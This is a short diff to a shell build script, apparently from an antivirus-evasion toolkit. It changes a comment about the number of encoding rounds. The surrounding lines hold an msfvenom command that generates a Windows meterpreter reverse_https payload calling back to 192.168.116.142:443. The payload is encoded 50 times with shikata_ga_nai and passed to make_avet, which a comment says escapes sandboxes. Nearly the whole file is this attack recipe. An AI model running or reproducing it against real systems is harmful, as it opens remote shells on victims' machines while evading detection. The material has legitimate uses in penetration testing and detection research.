@@ -4,7 +4,7 @@
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
-# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
+# make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > sc.txt
 # call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
 ./make_avet -f sc.txt
